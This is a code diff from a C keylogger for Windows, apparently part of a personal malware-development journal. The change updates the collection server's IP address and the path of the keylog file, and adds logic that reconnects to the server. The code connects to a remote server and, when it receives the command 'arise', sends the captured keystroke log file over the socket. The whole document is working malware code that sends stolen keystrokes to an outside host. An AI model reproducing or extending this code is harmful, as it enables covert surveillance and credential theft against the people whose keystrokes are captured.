@@ -5,13 +5,13 @@
 #include <windows.h>
 
 
-#define SERVER_IP "192.168.1.13"  // Change this to the Linux server IP
+#define SERVER_IP "192.168.1.14"  // Change this to the Linux server IP
 #define SERVER_PORT 2005
 #define BUF_SIZE 1024
 
 DWORD WINAPI send_logs(LPVOID lpBuffer) {
     FILE *fp;
-    char *filename = "C:\\Users\\blackrose\\Desktop\\MalDevJournal\\keylogger\\keylogger.txt";
+    char *filename = "C:\\Users\\blackrose\\Desktop\\MalDevJournal\\keylogger\\v1\\keylogger.txt";
     char buffer[BUF_SIZE];
     int bytes_sent;
     SOCKET sock = *(SOCKET*)lpBuffer;
@@ -41,14 +41,17 @@ DWORD WINAPI connect_to_server(LPVOID arg) {
     WSAStartup(MAKEWORD(2, 2), &wsaData);
     struct sockaddr_in server;
     char buffer[BUF_SIZE];
+    loop_back:
     sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
     server.sin_family = AF_INET;
     server.sin_addr.s_addr = inet_addr(SERVER_IP);
     server.sin_port = htons(SERVER_PORT);
     
     while(1){
+        
         int conn = 1;
         while(conn){
+        
         conn = connect(sock, (struct sockaddr *)&server, sizeof(server));
         Sleep(1000);
         }
@@ -58,6 +61,10 @@ DWORD WINAPI connect_to_server(LPVOID arg) {
             buffer[len] = 0;
             if (strcmp(buffer, "arise") == 0) {
                 recieve = CreateThread(NULL, 0, send_logs, &sock, NULL, NULL);
+            }
+            if (sock == INVALID_SOCKET) {
+                closesocket(sock);
+                goto loop_back;
             }
         }
             // Cleanup
